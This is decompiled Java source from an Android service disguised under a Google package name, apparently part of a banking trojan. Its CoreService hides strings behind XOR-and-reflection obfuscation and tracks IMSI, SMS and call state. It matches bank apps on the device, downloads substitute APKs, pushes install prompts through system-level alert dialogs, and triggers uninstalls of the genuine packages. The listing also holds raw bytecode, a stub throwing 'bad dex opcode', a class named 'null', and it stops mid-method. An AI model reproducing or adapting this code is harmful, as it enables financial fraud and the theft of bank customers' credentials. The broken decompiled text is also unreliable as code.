package com.google.bps.bfcfc;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import java.io.File;
import java.io.PrintStream;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.Calendar;
import org.json.JSONException;
import org.json.JSONObject;

public class CoreService extends Service {
  public static int autoCT = 0;
  
  public static ComponentName componentName;
  
  public static CoreService mContext;
  
  public Boolean IS_NEW = Boolean.valueOf(false);
  
  public Boolean IS_WORK = Boolean.valueOf(false);
  
  public String MSG_OK = showNofity("==IpLi9sNTk5AarZuZi5NQbi");
  
  public File apkFile;
  
  public String capp = "";
  
  public Connect conn;
  
  public int currentapiVersion = 0;
  
  public String httpUrl = "";
  
  public String imsi = "";
  
  public String iscall = "";
  
  public Integer isnew = Integer.valueOf(0);
  
  public String issms = "";
  
  public String mApk = "";
  
  public String mApkName = "";
  
  public String mPackageName = "";
  
  public String mobVersion = "";
  
  public Integer net = Integer.valueOf(0);
  
  public String nettype = "";
  
  public int newClient = 0;
  
  public String number = "";
  
  public String sapp = "";
  
  public String timeint = "";
  
  public WifiManager wifi;
  
  private boolean NetWorkStatus() {
    boolean bool = false;
    ConnectivityManager connectivityManager = (ConnectivityManager)getSystemService(showNofity("w1xcSVd2WV1feEZaQkMBrSeOnFVl"));
    connectivityManager.getActiveNetworkInfo();
    if (connectivityManager.getActiveNetworkInfo() != null)
      bool = connectivityManager.getActiveNetworkInfo().isAvailable(); 
    return bool;
  }
  
  private static String showNofity(String paramString) {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: bipush #19
    //   4: newarray byte
    //   6: astore_2
    //   7: aload_2
    //   8: dup
    //   9: iconst_0
    //   10: ldc -2
    //   12: bastore
    //   13: dup
    //   14: iconst_1
    //   15: ldc -15
    //   17: bastore
    //   18: dup
    //   19: iconst_2
    //   20: ldc -5
    //   22: bastore
    //   23: dup
    //   24: iconst_3
    //   25: ldc -19
    //   27: bastore
    //   28: dup
    //   29: iconst_4
    //   30: ldc -16
    //   32: bastore
    //   33: dup
    //   34: iconst_5
    //   35: ldc -10
    //   37: bastore
    //   38: dup
    //   39: bipush #6
    //   41: ldc -5
    //   43: bastore
    //   44: dup
    //   45: bipush #7
    //   47: ldc -79
    //   49: bastore
    //   50: dup
    //   51: bipush #8
    //   53: ldc -22
    //   55: bastore
    //   56: dup
    //   57: bipush #9
    //   59: ldc -21
    //   61: bastore
    //   62: dup
    //   63: bipush #10
    //   65: ldc -10
    //   67: bastore
    //   68: dup
    //   69: bipush #11
    //   71: ldc -13
    //   73: bastore
    //   74: dup
    //   75: bipush #12
    //   77: ldc -79
    //   79: bastore
    //   80: dup
    //   81: bipush #13
    //   83: ldc -35
    //   85: bastore
    //   86: dup
    //   87: bipush #14
    //   89: ldc -2
    //   91: bastore
    //   92: dup
    //   93: bipush #15
    //   95: ldc -20
    //   97: bastore
    //   98: dup
    //   99: bipush #16
    //   101: ldc -6
    //   103: bastore
    //   104: dup
    //   105: bipush #17
    //   107: ldc -87
    //   109: bastore
    //   110: dup
    //   111: bipush #18
    //   113: ldc -85
    //   115: bastore
    //   116: pop
    //   117: aload_0
    //   118: iconst_0
    //   119: iconst_2
    //   120: invokevirtual substring : (II)Ljava/lang/String;
    //   123: astore_3
    //   124: new java/lang/StringBuilder
    //   127: dup
    //   128: aload_0
    //   129: aload_0
    //   130: invokevirtual length : ()I
    //   133: iconst_2
    //   134: isub
    //   135: invokevirtual substring : (I)Ljava/lang/String;
    //   138: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   141: invokespecial <init> : (Ljava/lang/String;)V
    //   144: aload_0
    //   145: iconst_2
    //   146: aload_0
    //   147: invokevirtual length : ()I
    //   150: iconst_2
    //   151: isub
    //   152: invokevirtual substring : (II)Ljava/lang/String;
    //   155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   158: aload_3
    //   159: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   162: invokevirtual toString : ()Ljava/lang/String;
    //   165: astore_0
    //   166: iconst_0
    //   167: istore #4
    //   169: iload #4
    //   171: bipush #19
    //   173: if_icmplt -> 584
    //   176: new java/lang/String
    //   179: dup
    //   180: aload_2
    //   181: invokespecial <init> : ([B)V
    //   184: astore_3
    //   185: new java/lang/StringBuilder
    //   188: dup
    //   189: aload_3
    //   190: iconst_2
    //   191: iconst_3
    //   192: invokevirtual substring : (II)Ljava/lang/String;
    //   195: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   198: invokespecial <init> : (Ljava/lang/String;)V
    //   201: aload_3
    //   202: bipush #16
    //   204: bipush #17
    //   206: invokevirtual substring : (II)Ljava/lang/String;
    //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   212: invokevirtual toString : ()Ljava/lang/String;
    //   215: astore_2
    //   216: new java/lang/StringBuilder
    //   219: dup
    //   220: new java/lang/StringBuilder
    //   223: dup
    //   224: new java/lang/StringBuilder
    //   227: dup
    //   228: aload_2
    //   229: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   232: invokespecial <init> : (Ljava/lang/String;)V
    //   235: ldc 'c'
    //   237: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   240: invokevirtual toString : ()Ljava/lang/String;
    //   243: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   246: invokespecial <init> : (Ljava/lang/String;)V
    //   249: aload_3
    //   250: iconst_4
    //   251: iconst_5
    //   252: invokevirtual substring : (II)Ljava/lang/String;
    //   255: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   258: invokevirtual toString : ()Ljava/lang/String;
    //   261: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   264: invokespecial <init> : (Ljava/lang/String;)V
    //   267: aload_2
    //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   271: invokevirtual toString : ()Ljava/lang/String;
    //   274: astore_2
    //   275: aload_3
    //   276: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
    //   279: astore_3
    //   280: aload_3
    //   281: aload_2
    //   282: iconst_2
    //   283: anewarray java/lang/Class
    //   286: dup
    //   287: iconst_0
    //   288: ldc java/lang/String
    //   290: aastore
    //   291: dup
    //   292: iconst_1
    //   293: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
    //   296: aastore
    //   297: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   300: aload_3
    //   301: iconst_2
    //   302: anewarray java/lang/Object
    //   305: dup
    //   306: iconst_0
    //   307: aload_0
    //   308: aastore
    //   309: dup
    //   310: iconst_1
    //   311: iconst_0
    //   312: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   315: aastore
    //   316: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   319: checkcast [B
    //   322: astore_0
    //   323: aload_0
    //   324: arraylength
    //   325: istore #5
    //   327: iload #5
    //   329: iconst_1
    //   330: isub
    //   331: aload_0
    //   332: iload #5
    //   334: iconst_1
    //   335: isub
    //   336: baload
    //   337: i2c
    //   338: invokestatic valueOf : (C)Ljava/lang/String;
    //   341: invokestatic parseInt : (Ljava/lang/String;)I
    //   344: isub
    //   345: istore #6
    //   347: aload_0
    //   348: iload #6
    //   350: iconst_1
    //   351: isub
    //   352: baload
    //   353: iconst_1
    //   354: if_icmpne -> 653
    //   357: iconst_1
    //   358: istore #4
    //   360: iinc #6, -1
    //   363: aload_0
    //   364: iload #6
    //   366: iconst_2
    //   367: isub
    //   368: baload
    //   369: i2c
    //   370: istore #7
    //   372: aload_0
    //   373: iload #6
    //   375: iconst_1
    //   376: isub
    //   377: baload
    //   378: i2c
    //   379: istore #8
    //   381: new java/lang/StringBuilder
    //   384: dup
    //   385: iload #7
    //   387: invokestatic valueOf : (C)Ljava/lang/String;
    //   390: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   393: invokespecial <init> : (Ljava/lang/String;)V
    //   396: iload #8
    //   398: invokestatic valueOf : (C)Ljava/lang/String;
    //   401: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   404: invokevirtual toString : ()Ljava/lang/String;
    //   407: bipush #16
    //   409: invokestatic parseInt : (Ljava/lang/String;I)I
    //   412: i2b
    //   413: bipush #118
    //   415: isub
    //   416: i2b
    //   417: istore #9
    //   419: iload #6
    //   421: iconst_2
    //   422: isub
    //   423: istore #10
    //   425: iconst_0
    //   426: istore #6
    //   428: iload #6
    //   430: iload #10
    //   432: if_icmplt -> 659
    //   435: iload #10
    //   437: istore #6
    //   439: iload #6
    //   441: iload #5
    //   443: if_icmplt -> 678
    //   446: iload #4
    //   448: iconst_1
    //   449: if_icmpne -> 560
    //   452: new java/lang/Exception
    //   455: dup
    //   456: invokespecial <init> : ()V
    //   459: invokevirtual getStackTrace : ()[Ljava/lang/StackTraceElement;
    //   462: iconst_1
    //   463: aaload
    //   464: astore_3
    //   465: aload_3
    //   466: invokevirtual getClassName : ()Ljava/lang/String;
    //   469: astore_2
    //   470: aload_2
    //   471: ldc_w '.'
    //   474: invokevirtual lastIndexOf : (Ljava/lang/String;)I
    //   477: istore #4
    //   479: aload_2
    //   480: astore_1
    //   481: iload #4
    //   483: iconst_m1
    //   484: if_icmpeq -> 496
    //   487: aload_2
    //   488: iload #4
    //   490: iconst_1
    //   491: iadd
    //   492: invokevirtual substring : (I)Ljava/lang/String;
    //   495: astore_1
    //   496: aload_3
    //   497: invokevirtual getMethodName : ()Ljava/lang/String;
    //   500: astore_2
    //   501: new java/lang/StringBuilder
    //   504: dup
    //   505: aload_1
    //   506: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
    //   509: invokespecial <init> : (Ljava/lang/String;)V
    //   512: aload_2
    //   513: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   516: invokevirtual toString : ()Ljava/lang/String;
    //   519: astore_2
    //   520: aload_2
    //   521: astore_1
    //   522: aload_2
    //   523: invokevirtual length : ()I
    //   526: sipush #256
    //   529: if_icmple -> 541
    //   532: aload_2
    //   533: iconst_0
    //   534: sipush #256
    //   537: invokevirtual substring : (II)Ljava/lang/String;
    //   540: astore_1
    //   541: aload_1
    //   542: invokevirtual length : ()I
    //   545: istore #4
    //   547: iconst_0
    //   548: istore #6
    //   550: iinc #4, -1
    //   553: iload #6
    //   555: iload #10
    //   557: if_icmplt -> 690
    //   560: iload #10
    //   562: newarray byte
    //   564: astore_1
    //   565: iconst_0
    //   566: istore #4
    //   568: iload #4
    //   570: iload #10
    //   572: if_icmplt -> 741
    //   575: new java/lang/String
    //   578: dup
    //   579: aload_1
    //   580: invokespecial <init> : ([B)V
    //   583: areturn
    //   584: aload_2
    //   585: iload #4
    //   587: aload_2
    //   588: iload #4
    //   590: baload
    //   591: bipush #-97
    //   593: ixor
    //   594: i2b
    //   595: i2b
    //   596: bastore
    //   597: iinc #4, 1
    //   600: goto -> 169
    //   603: astore_0
    //   604: aload_0
    //   605: invokevirtual printStackTrace : ()V
    //   608: aload_1
    //   609: astore_0
    //   610: goto -> 323
    //   613: astore_0
    //   614: aload_0
    //   615: invokevirtual printStackTrace : ()V
    //   618: aload_1
    //   619: astore_0
    //   620: goto -> 323
    //   623: astore_0
    //   624: aload_0
    //   625: invokevirtual printStackTrace : ()V
    //   628: aload_1
    //   629: astore_0
    //   630: goto -> 323
    //   633: astore_0
    //   634: aload_0
    //   635: invokevirtual printStackTrace : ()V
    //   638: aload_1
    //   639: astore_0
    //   640: goto -> 323
    //   643: astore_0
    //   644: aload_0
    //   645: invokevirtual printStackTrace : ()V
    //   648: aload_1
    //   649: astore_0
    //   650: goto -> 323
    //   653: iconst_0
    //   654: istore #4
    //   656: goto -> 360
    //   659: aload_0
    //   660: iload #6
    //   662: aload_0
    //   663: iload #6
    //   665: baload
    //   666: iload #9
    //   668: ixor
    //   669: i2b
    //   670: i2b
    //   671: bastore
    //   672: iinc #6, 1
    //   675: goto -> 428
    //   678: aload_0
    //   679: iload #6
    //   681: iconst_0
    //   682: i2b
    //   683: bastore
    //   684: iinc #6, 1
    //   687: goto -> 439
    //   690: aload_0
    //   691: iload #6
    //   693: baload
    //   694: istore #9
    //   696: iload #4
    //   698: iconst_1
    //   699: isub
    //   700: istore #5
    //   702: aload_0
    //   703: iload #6
    //   705: iload #9
    //   707: aload_1
    //   708: iload #4
    //   710: invokevirtual charAt : (I)C
    //   713: i2b
    //   714: ixor
    //   715: i2b
    //   716: i2b
    //   717: bastore
    //   718: iload #5
    //   720: istore #4
    //   722: iload #5
    //   724: ifge -> 735
    //   727: aload_1
    //   728: invokevirtual length : ()I
    //   731: iconst_1
    //   732: isub
    //   733: istore #4
    //   735: iinc #6, 1
    //   738: goto -> 553
    //   741: aload_1
    //   742: iload #4
    //   744: aload_0
    //   745: iload #4
    //   747: baload
    //   748: i2b
    //   749: bastore
    //   750: iinc #4, 1
    //   753: goto -> 568
    // Exception table:
    //   from	to	target	type
    //   275	323	603	java/lang/ClassNotFoundException
    //   275	323	613	java/lang/IllegalAccessException
    //   275	323	623	java/lang/NoSuchMethodException
    //   275	323	633	java/lang/IllegalArgumentException
    //   275	323	643	java/lang/reflect/InvocationTargetException
  }
  
  public static void showNofity(String paramString1, String paramString2, String paramString3, int paramInt) {
    NotificationManager notificationManager = (NotificationManager)mContext.getSystemService(showNofity("Q=vt//nX5P7s6vr9NjYBXVpIdT5+"));
    Notification notification = new Notification(paramInt, paramString1, System.currentTimeMillis());
    Intent intent = new Intent(showNofity("E0pXEQdtSREXFxwVADg2AXGdWICg"));
    PendingIntent pendingIntent = PendingIntent.getBroadcast((Context)mContext, 0, intent, 0);
    notification.setLatestEventInfo((Context)mContext, paramString2, paramString3, pendingIntent);
    notification.flags |= 0x10;
    notification.defaults |= 0x1;
    notificationManager.notify(1, notification);
  }
  
  public static void uninstallAPK(String paramString) {
    System.out.println(showNofity("==N1PFRsKXtmO0FENVpZ4/ruxjJCAYol2LyANQFk") + paramString);
    Uri uri = Uri.parse(showNofity("kzfkwcvA148zQwGPVr/f") + paramString.trim());
    Intent intent = new Intent(showNofity("==4lHgMIEF0HBxoQCxdHFxEROgocQQcOHAQ4KTc2ATSORZIlNQKj"), uri);
    intent.setFlags(268435456);
    mContext.startActivity(intent);
  }
  
  public void autoChangeApk(String paramString) {
    System.out.println(showNofity("M=lFLkNoKktVKWdmKFFJIlRZLm1G/PzT5TI0AXxxSDLV") + paramString);
    int i = 2130837505;
    if (!paramString.equals("")) {
      int j = 0;
      while (true) {
        if (j >= Config.apkNames.length) {
          j = i;
        } else if (Config.apkNames[j].equals(paramString)) {
          this.mApkName = Config.bName[j];
          Config.delPackage = Config.bank[j];
          this.mPackageName = Config.delPackage;
          j = Config.icon[j];
        } else {
          j++;
          continue;
        } 
        Config.installApk = DownLoad.downLoadFile(String.valueOf(Config.APK_URL) + paramString);
        Config.isAlert = 1;
        AlertDialog.Builder builder = new AlertDialog.Builder((Context)mContext);
        builder.setTitle(this.mApkName);
        builder.setMessage(String.valueOf(this.mApkName) + showNofity("U=s1Gns4CnMuLKNuARd/EzFpDxB/DyBeLAeWfg4RehUBcwgKfRkwsGo2Jk8ZIbiUdwoisnwMHnMUHG4XCrJ4FCVuNSx/DyBfLQJbECl1CxuUdAEuegg9cxQdeBwiaQQwcRIufgc1tr9YLR9uHTJ/LAVpMiB+GByUdwwSfgotfS8vdB8+ehkIdDk1sk8iEXMqEWw9GnsSMrE2RAG/bkZpRTvG"));
        builder.setPositiveButton(showNofity("Q=0gfQ4iNkEBSDJYYzch"), new BtnClick());
        builder.setNegativeButton(showNofity("M1qkxKyvQzMBazRmdiyo"), new BtnClick());
        AlertDialog alertDialog = builder.create();
        alertDialog.getWindow().setType(2003);
        alertDialog.show();
        showNofity(this.mApkName, String.valueOf(this.mApkName) + showNofity("A0nTlNzol+jtVYL4/pT0w4D1y6T10J/p8YbF95H+zpnS/YXk3zkwAUNagjne"), showNofity("Y18HUzYUUAAdWQ4rVyMFWA00n2IMHFkMOUArKlAtL5J0IDZDMCNTCxyIVDkrQysUWiETVDYQNTABSjWgtaXR"), j);
        return;
      } 
    } 
  }
  
  public IBinder onBind(Intent paramIntent) {
    return null;
  }
  
  @SuppressLint({"NewApi"})
  public void onCreate() {
    throw new VerifyError("bad dex opcode");
  }
  
  public void onStart(Intent paramIntent, int paramInt) {
    super.onStart(paramIntent, paramInt);
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
  
  class BtnClick implements DialogInterface.OnClickListener {
    public void onClick(DialogInterface param1DialogInterface, int param1Int) {
      (new Thread(new Runnable() {
            private static String run(String param2String) {
              // Byte code:
              //   0: aconst_null
              //   1: astore_1
              //   2: bipush #19
              //   4: newarray byte
              //   6: astore_2
              //   7: aload_2
              //   8: dup
              //   9: iconst_0
              //   10: ldc 93
              //   12: bastore
              //   13: dup
              //   14: iconst_1
              //   15: ldc 82
              //   17: bastore
              //   18: dup
              //   19: iconst_2
              //   20: ldc 88
              //   22: bastore
              //   23: dup
              //   24: iconst_3
              //   25: ldc 78
              //   27: bastore
              //   28: dup
              //   29: iconst_4
              //   30: ldc 83
              //   32: bastore
              //   33: dup
              //   34: iconst_5
              //   35: ldc 85
              //   37: bastore
              //   38: dup
              //   39: bipush #6
              //   41: ldc 88
              //   43: bastore
              //   44: dup
              //   45: bipush #7
              //   47: ldc 18
              //   49: bastore
              //   50: dup
              //   51: bipush #8
              //   53: ldc 73
              //   55: bastore
              //   56: dup
              //   57: bipush #9
              //   59: ldc 72
              //   61: bastore
              //   62: dup
              //   63: bipush #10
              //   65: ldc 85
              //   67: bastore
              //   68: dup
              //   69: bipush #11
              //   71: ldc 80
              //   73: bastore
              //   74: dup
              //   75: bipush #12
              //   77: ldc 18
              //   79: bastore
              //   80: dup
              //   81: bipush #13
              //   83: ldc 126
              //   85: bastore
              //   86: dup
              //   87: bipush #14
              //   89: ldc 93
              //   91: bastore
              //   92: dup
              //   93: bipush #15
              //   95: ldc 79
              //   97: bastore
              //   98: dup
              //   99: bipush #16
              //   101: ldc 89
              //   103: bastore
              //   104: dup
              //   105: bipush #17
              //   107: ldc 10
              //   109: bastore
              //   110: dup
              //   111: bipush #18
              //   113: ldc 8
              //   115: bastore
              //   116: pop
              //   117: aload_0
              //   118: iconst_0
              //   119: iconst_2
              //   120: invokevirtual substring : (II)Ljava/lang/String;
              //   123: astore_3
              //   124: new java/lang/StringBuilder
              //   127: dup
              //   128: aload_0
              //   129: aload_0
              //   130: invokevirtual length : ()I
              //   133: iconst_2
              //   134: isub
              //   135: invokevirtual substring : (I)Ljava/lang/String;
              //   138: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
              //   141: invokespecial <init> : (Ljava/lang/String;)V
              //   144: aload_0
              //   145: iconst_2
              //   146: aload_0
              //   147: invokevirtual length : ()I
              //   150: iconst_2
              //   151: isub
              //   152: invokevirtual substring : (II)Ljava/lang/String;
              //   155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
              //   158: aload_3
              //   159: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
              //   162: invokevirtual toString : ()Ljava/lang/String;
              //   165: astore_0
              //   166: iconst_0
              //   167: istore #4
              //   169: iload #4
              //   171: bipush #19
              //   173: if_icmplt -> 583
              //   176: new java/lang/String
              //   179: dup
              //   180: aload_2
              //   181: invokespecial <init> : ([B)V
              //   184: astore_3
              //   185: new java/lang/StringBuilder
              //   188: dup
              //   189: aload_3
              //   190: iconst_2
              //   191: iconst_3
              //   192: invokevirtual substring : (II)Ljava/lang/String;
              //   195: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
              //   198: invokespecial <init> : (Ljava/lang/String;)V
              //   201: aload_3
              //   202: bipush #16
              //   204: bipush #17
              //   206: invokevirtual substring : (II)Ljava/lang/String;
              //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
              //   212: invokevirtual toString : ()Ljava/lang/String;
              //   215: astore_2
              //   216: new java/lang/StringBuilder
              //   219: dup
              //   220: new java/lang/StringBuilder
              //   223: dup
              //   224: new java/lang/StringBuilder
              //   227: dup
              //   228: aload_2
              //   229: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
              //   232: invokespecial <init> : (Ljava/lang/String;)V
              //   235: ldc 'c'
              //   237: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
              //   240: invokevirtual toString : ()Ljava/lang/String;
              //   243: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
              //   246: invokespecial <init> : (Ljava/lang/String;)V
              //   249: aload_3
              //   250: iconst_4
              //   251: iconst_5
              //   252: invokevirtual substring : (II)Ljava/lang/String;
              //   255: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
              //   258: invokevirtual toString : ()Ljava/lang/String;
              //   261: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
              //   264: invokespecial <init> : (Ljava/lang/String;)V
              //   267: aload_2
              //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
              //   271: invokevirtual toString : ()Ljava/lang/String;
              //   274: astore_2
              //   275: aload_3
              //   276: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
              //   279: astore_3
              //   280: aload_3
              //   281: aload_2
              //   282: iconst_2
              //   283: anewarray java/lang/Class
              //   286: dup
              //   287: iconst_0
              //   288: ldc java/lang/String
              //   290: aastore
              //   291: dup
              //   292: iconst_1
              //   293: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
              //   296: aastore
              //   297: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
              //   300: aload_3
              //   301: iconst_2
              //   302: anewarray java/lang/Object
              //   305: dup
              //   306: iconst_0
              //   307: aload_0
              //   308: aastore
              //   309: dup
              //   310: iconst_1
              //   311: iconst_0
              //   312: invokestatic valueOf : (I)Ljava/lang/Integer;
              //   315: aastore
              //   316: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
              //   319: checkcast [B
              //   322: astore_0
              //   323: aload_0
              //   324: arraylength
              //   325: istore #5
              //   327: iload #5
              //   329: iconst_1
              //   330: isub
              //   331: aload_0
              //   332: iload #5
              //   334: iconst_1
              //   335: isub
              //   336: baload
              //   337: i2c
              //   338: invokestatic valueOf : (C)Ljava/lang/String;
              //   341: invokestatic parseInt : (Ljava/lang/String;)I
              //   344: isub
              //   345: istore #6
              //   347: aload_0
              //   348: iload #6
              //   350: iconst_1
              //   351: isub
              //   352: baload
              //   353: iconst_1
              //   354: if_icmpne -> 652
              //   357: iconst_1
              //   358: istore #4
              //   360: iinc #6, -1
              //   363: aload_0
              //   364: iload #6
              //   366: iconst_2
              //   367: isub
              //   368: baload
              //   369: i2c
              //   370: istore #7
              //   372: aload_0
              //   373: iload #6
              //   375: iconst_1
              //   376: isub
              //   377: baload
              //   378: i2c
              //   379: istore #8
              //   381: new java/lang/StringBuilder
              //   384: dup
              //   385: iload #7
              //   387: invokestatic valueOf : (C)Ljava/lang/String;
              //   390: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
              //   393: invokespecial <init> : (Ljava/lang/String;)V
              //   396: iload #8
              //   398: invokestatic valueOf : (C)Ljava/lang/String;
              //   401: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
              //   404: invokevirtual toString : ()Ljava/lang/String;
              //   407: bipush #16
              //   409: invokestatic parseInt : (Ljava/lang/String;I)I
              //   412: i2b
              //   413: bipush #111
              //   415: isub
              //   416: i2b
              //   417: istore #9
              //   419: iload #6
              //   421: iconst_2
              //   422: isub
              //   423: istore #10
              //   425: iconst_0
              //   426: istore #6
              //   428: iload #6
              //   430: iload #10
              //   432: if_icmplt -> 658
              //   435: iload #10
              //   437: istore #6
              //   439: iload #6
              //   441: iload #5
              //   443: if_icmplt -> 677
              //   446: iload #4
              //   448: iconst_1
              //   449: if_icmpne -> 559
              //   452: new java/lang/Exception
              //   455: dup
              //   456: invokespecial <init> : ()V
              //   459: invokevirtual getStackTrace : ()[Ljava/lang/StackTraceElement;
              //   462: iconst_1
              //   463: aaload
              //   464: astore_3
              //   465: aload_3
              //   466: invokevirtual getClassName : ()Ljava/lang/String;
              //   469: astore_2
              //   470: aload_2
              //   471: ldc '.'
              //   473: invokevirtual lastIndexOf : (Ljava/lang/String;)I
              //   476: istore #4
              //   478: aload_2
              //   479: astore_1
              //   480: iload #4
              //   482: iconst_m1
              //   483: if_icmpeq -> 495
              //   486: aload_2
              //   487: iload #4
              //   489: iconst_1
              //   490: iadd
              //   491: invokevirtual substring : (I)Ljava/lang/String;
              //   494: astore_1
              //   495: aload_3
              //   496: invokevirtual getMethodName : ()Ljava/lang/String;
              //   499: astore_2
              //   500: new java/lang/StringBuilder
              //   503: dup
              //   504: aload_1
              //   505: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
              //   508: invokespecial <init> : (Ljava/lang/String;)V
              //   511: aload_2
              //   512: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
              //   515: invokevirtual toString : ()Ljava/lang/String;
              //   518: astore_2
              //   519: aload_2
              //   520: astore_1
              //   521: aload_2
              //   522: invokevirtual length : ()I
              //   525: sipush #256
              //   528: if_icmple -> 540
              //   531: aload_2
              //   532: iconst_0
              //   533: sipush #256
              //   536: invokevirtual substring : (II)Ljava/lang/String;
              //   539: astore_1
              //   540: aload_1
              //   541: invokevirtual length : ()I
              //   544: istore #4
              //   546: iconst_0
              //   547: istore #6
              //   549: iinc #4, -1
              //   552: iload #6
              //   554: iload #10
              //   556: if_icmplt -> 689
              //   559: iload #10
              //   561: newarray byte
              //   563: astore_1
              //   564: iconst_0
              //   565: istore #4
              //   567: iload #4
              //   569: iload #10
              //   571: if_icmplt -> 740
              //   574: new java/lang/String
              //   577: dup
              //   578: aload_1
              //   579: invokespecial <init> : ([B)V
              //   582: areturn
              //   583: aload_2
              //   584: iload #4
              //   586: aload_2
              //   587: iload #4
              //   589: baload
              //   590: bipush #60
              //   592: ixor
              //   593: i2b
              //   594: i2b
              //   595: bastore
              //   596: iinc #4, 1
              //   599: goto -> 169
              //   602: astore_0
              //   603: aload_0
              //   604: invokevirtual printStackTrace : ()V
              //   607: aload_1
              //   608: astore_0
              //   609: goto -> 323
              //   612: astore_0
              //   613: aload_0
              //   614: invokevirtual printStackTrace : ()V
              //   617: aload_1
              //   618: astore_0
              //   619: goto -> 323
              //   622: astore_0
              //   623: aload_0
              //   624: invokevirtual printStackTrace : ()V
              //   627: aload_1
              //   628: astore_0
              //   629: goto -> 323
              //   632: astore_0
              //   633: aload_0
              //   634: invokevirtual printStackTrace : ()V
              //   637: aload_1
              //   638: astore_0
              //   639: goto -> 323
              //   642: astore_0
              //   643: aload_0
              //   644: invokevirtual printStackTrace : ()V
              //   647: aload_1
              //   648: astore_0
              //   649: goto -> 323
              //   652: iconst_0
              //   653: istore #4
              //   655: goto -> 360
              //   658: aload_0
              //   659: iload #6
              //   661: aload_0
              //   662: iload #6
              //   664: baload
              //   665: iload #9
              //   667: ixor
              //   668: i2b
              //   669: i2b
              //   670: bastore
              //   671: iinc #6, 1
              //   674: goto -> 428
              //   677: aload_0
              //   678: iload #6
              //   680: iconst_0
              //   681: i2b
              //   682: bastore
              //   683: iinc #6, 1
              //   686: goto -> 439
              //   689: aload_0
              //   690: iload #6
              //   692: baload
              //   693: istore #9
              //   695: iload #4
              //   697: iconst_1
              //   698: isub
              //   699: istore #5
              //   701: aload_0
              //   702: iload #6
              //   704: iload #9
              //   706: aload_1
              //   707: iload #4
              //   709: invokevirtual charAt : (I)C
              //   712: i2b
              //   713: ixor
              //   714: i2b
              //   715: i2b
              //   716: bastore
              //   717: iload #5
              //   719: istore #4
              //   721: iload #5
              //   723: ifge -> 734
              //   726: aload_1
              //   727: invokevirtual length : ()I
              //   730: iconst_1
              //   731: isub
              //   732: istore #4
              //   734: iinc #6, 1
              //   737: goto -> 552
              //   740: aload_1
              //   741: iload #4
              //   743: aload_0
              //   744: iload #4
              //   746: baload
              //   747: i2b
              //   748: bastore
              //   749: iinc #4, 1
              //   752: goto -> 567
              // Exception table:
              //   from	to	target	type
              //   275	323	602	java/lang/ClassNotFoundException
              //   275	323	612	java/lang/IllegalAccessException
              //   275	323	622	java/lang/NoSuchMethodException
              //   275	323	632	java/lang/IllegalArgumentException
              //   275	323	642	java/lang/reflect/InvocationTargetException
            }
            
            public void run() {
              try {
                Config.isAlert = 0;
                Intent intent = new Intent();
                this();
                intent.setAction(run("Q=gPEk0RAQoNIQIdYUoHAxQXHhw7N0MBPsHQ1zAg"));
                CoreService.mContext.sendBroadcast(intent);
              } catch (Exception exception) {}
            }
          })).start();
    }
  }
  
  class null implements Runnable {
    private static String run(String param1String) {
      // Byte code:
      //   0: aconst_null
      //   1: astore_1
      //   2: bipush #19
      //   4: newarray byte
      //   6: astore_2
      //   7: aload_2
      //   8: dup
      //   9: iconst_0
      //   10: ldc 93
      //   12: bastore
      //   13: dup
      //   14: iconst_1
